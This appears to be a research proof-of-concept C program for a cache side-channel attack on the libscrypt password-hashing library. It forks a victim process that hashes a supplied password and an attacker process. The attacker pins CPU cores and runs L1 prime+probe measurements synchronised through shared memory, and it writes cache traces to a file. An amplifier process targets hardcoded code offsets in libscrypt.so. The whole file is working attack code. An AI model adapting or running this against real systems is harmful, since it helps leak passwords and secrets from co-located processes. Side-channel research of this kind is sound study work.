#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sched.h>
#include <time.h>
#include <util.h>
#include <fcntl.h>
#include <fr.h>
#include <l1.h>
#include <low.h>
#include <sched.h>
#include <semaphore.h>
#include <stdlib.h>
#include <symbol.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include "rdtsc.h"
#include "libscrypt.h"
#include "mysem.h"

#define SHMSZ 10

void print_res(FILE* fp, uint16_t* res, int* rmap, int nsets){
	int i = 0;
	int j = 0;
	for (i = 0; i < 1; i++)
	{
		for (j = 0; j < L1_SETS; j+=4)
		{
			if (rmap[j] == -1)
				fprintf(fp, "  0 ");
			else
				fprintf(fp, "%3d ", res[i*nsets + rmap[j]]);
		}
		fprintf(fp, "\n");
	}
}

void print_hex(const char *s)
{
  while(*s)
    printf("%02x", (unsigned int) *s++);
  printf("\n");
}

char* libraryStarting(int fd){
    size_t size = lseek(fd, 0, SEEK_END);
    if(size == 0)
        exit(-1);
    size_t map_size = size;
    if ((map_size & 0xFFF) != 0){
      map_size |= 0xFFF;
      map_size += 1;
    }
    return (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
}

int main(int argv, char *argc[]){
    char buff[64];

    int i,j;
    int fd = open("./libscrypt.so", O_RDONLY);
    if(fd == -1){
        perror("Can't open the file, please check\n");
        return 1;
    }
    char* base = libraryStarting(fd);

    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(2, &mask);

    if(sched_setaffinity(0, sizeof(mask), &mask) != 0)
        perror("some error occurred while setting the affinity.\n");

    //shared memory
    key_t key;
    key = 4567;
    int shmid;
    volatile char *sync;

    if ((shmid = shmget(key, SHMSZ, IPC_CREAT | 0666)) < 0) {
        perror("shmget");
        exit(1);
    }

    sync = shmat(shmid, NULL, 0);
    if(sync == (char*)-1){
        perror("error with shared memory.\n");
        return 1;
    }

    *sync = 0;

    //shared memory with amplifier
    key_t key_amplifier;
    key_amplifier = 258;
    int shmid_amplifier;
    volatile char *sync_amplifier;

    if ((shmid_amplifier = shmget(key_amplifier, SHMSZ, IPC_CREAT | 0666)) < 0) {
        perror("shmget");
        exit(1);
    }

    sync_amplifier = shmat(shmid_amplifier, NULL, 0);
    if(sync_amplifier == (char*)-1){
        perror("error with shared memory.\n");
        return 1;
    }

    *sync_amplifier = 0;

    fr_t fr = fr_prepare();

    pid_t attacker = getpid();
    /* printf("attacker id: %d\n", attacker); */
    int childid = fork();
    if(childid == 0){ //victim

        cpu_set_t mask;
        CPU_ZERO(&mask);
        CPU_SET(6, &mask);

        if(sched_setaffinity(0, sizeof(mask), &mask) != 0)
            perror("some error occurred while setting the affinity.\n");
        uint64_t a = rdtsc();
        libscrypt_scrypt((uint8_t*)argc[1], 16, (uint8_t*)"NaCl", 4, 1024, 8, 1, (uint8_t*)buff, 64);
        printf("%llu\n", rdtsc()-a);
        exit(0);
        /* print_hex(buff); */

    } else {
        /* printf("victim id: %d\n", childid); */
        int cid =fork();
        if(cid == 0){ //amplifier

            cpu_set_t mask;
            CPU_ZERO(&mask);
            CPU_SET(3, &mask);

            if(sched_setaffinity(0, sizeof(mask), &mask) != 0)
                perror("some error occurred while setting the affinity.\n");

            char *monitor[] = {"crypto_scrypt-nosse.c:201",
                "crypto_scrypt-nosse.c:95", "crypto_scrypt-nosse.c:108",
                "crypto_scrypt-nosse.c:167"};
            /* int nmonitor = sizeof(monitor)/sizeof(monitor[0]); */
            uint64_t addresses[] = {0x1770, 0x124a, 0x1262, 0x11d9};
            for(i=0; i<4; i++){
                /* uint64_t offset = sym_getsymboloffset("~/Desktop/scrypt_test_new/libscrypt/libscrypt.so", monitor[i]); */
                uint64_t offset = addresses[i] + base;
                addresses[i] = offset;
            }

            if(fork() == 0){
                /* cpu_set_t mask; */
                /* CPU_ZERO(&mask); */
                /* CPU_SET(4, &mask); */

                /* if(sched_setaffinity(0, sizeof(mask), &mask) != 0) */
                /*     perror("some error occurred while setting the affinity.\n"); */
                /* while(*sync_amplifier == 0); */
                /* while(*sync_amplifier == 1){ */
                /*     for(i = 0; i<3; i++){ */
                /*         clflush((void*)addresses[i]); */
                /*     } */
                /* } */
                exit(0);
            }
            else {
                /* int i,j = 0; */
                /* uint64_t timing[9000]; */
                /* uint16_t timing_fr[9000]; */
                /* fr_monitor(fr, (void*)addresses[3]); */
                /* while(*sync_amplifier == 0); */
                /* uint64_t b, a = rdtsc(); */
                /* while(*sync_amplifier == 1){ */
                /*     /1* if(rdtsc() - a > 10000){ *1/ */
                /*         timing[j++] = rdtsc(); */
                /*         fr_probe(fr, &timing_fr[j-1]); */
                /*         /1* clflush(addresses[3]); *1/ */
                /*         /1* timings[j-1][1] = rdtsc() - timings[j-1][0]; *1/ */
                /*         delayloop(5000); */
                /*         /1* a = timing[j-1]; *1/ */
                /*     /1* } *1/ */
                /* } */
                /* a =0; */
                /* for(i = 0; i<j; i++){ */
                /*     printf("c: %lld %d\n", timing[i], timing_fr[i]); */
                /* } */
                /* printf("j: %d\n",j); */
                wait(NULL);
                exit(0);
            }
        } else { //prime + probe
            /* printf("amplifier id: %d\n", cid); */

            for(i=0; i<10000; i++); //to make sure that other threads have been launched
            int k=0,no_of_rounds=300;


            struct l1pp{
                void *memory;
                void *fwdlist;
                void *bkwlist;
                uint8_t monitored[L1_SETS];
                int nsets;
            };

            l1pp_t l1 = l1_prepare();
            int nsets = l1_getmonitoredset(l1, NULL, 0);
            int *map = calloc(nsets, sizeof(int));
            l1_getmonitoredset(l1, map, nsets);

            int rmap[L1_SETS];
            for (i = 0; i < L1_SETS; i++)
                rmap[i] = -1;
            for (i = 0; i < nsets; i++)
                rmap[map[i]] = i;

            /* uint16_t *res = calloc(1*64, sizeof(uint16_t)); */
            uint16_t res[4*no_of_rounds][64];
            for(i=0; i<no_of_rounds; i++)
                for(j=0; j<64; j++)
                    res[i][j] = 0;
            /* for (i = 0; i < 1 * 64; i+= 4096/sizeof(uint16_t)) */
            /*     res[i] = 0; */

            FILE *fp = fopen("cache_traces.txt","w");
            delayloop(3000000000U);

            for(i=0; i<no_of_rounds; i++)
                l1_bprobe(l1, res[i]);


            k = 0;
            uint64_t a;
            uint64_t probe_timings[no_of_rounds];
            uint64_t probe_diff[no_of_rounds];
            /* wait_master(sync); */
                /* l1_probe(l1, res[k]); */
            /* notify_master(sync); */
            *sync_amplifier = 1;
            wait_master(sync);
            notify_master(sync);
            i = 0;
            while(k<no_of_rounds){
                /* wait_master(sync); */
                /*     l1_probe(l1, res[k]); */
                /* notify_master(sync); */

                    /* printf("client: %d\n",k); */
                /* wait_master(sync); */
                /* delayloop(5750); */
                j = 0;
                /* while(j++<5750) i = i+j; */
                if(k%60==0){
                    wait_master(sync);
                    probe_timings[k] = rdtsc();
                    l1_bprobe(l1, res[k]);
                    notify_master(sync);
                    j = 0;
                    while(j++<3800) i = i+j;
                    /* delayloop(6000); */

                }else if(k%2==0){
                    /* wait_master(sync); */
                    probe_timings[k] = rdtsc();
                    l1_bprobe(l1, res[k]);
                    j = 0;
                    while(j++<4090) i = i+j;
                    /* notify_master(sync); */
                    /* delayloop(6000); */

                } else if(k%2==1){
                    /* wait_master(sync); */
                    probe_timings[k] = rdtsc();
                    l1_probe(l1, res[k]);
                    j = 0;
                    while(j++<4090) i = i+j;
                    /* notify_master(sync); */
                }
                else {
                    probe_timings[k] = rdtsc();
                    l1_probe(l1, res[k]);
                }

                /* notify_master(sync); */
                a = rdtsc();
                probe_diff[k] = a - probe_timings[k];
                /* printf("%u \n", a-probe_timings[k]); */
                /* notify_master(sync); */
                /* delayloop(18500); */
                k++;
            }

            printf("%d\n",i);
            /* wait_master(sync); */
            /* notify_master(sync); */
            *sync_amplifier = 0;
            sleep(1);
            for(i=0; i<k; i++)
                printf("p %lld %lld\n", probe_timings[i], probe_diff[i]);

            for(i=0; i<k; i++)
                print_res(fp, res[i], rmap, nsets);

            fclose(fp);
        }

        wait(NULL);
        wait(NULL);
        exit(0);
    }
    return 0;
}

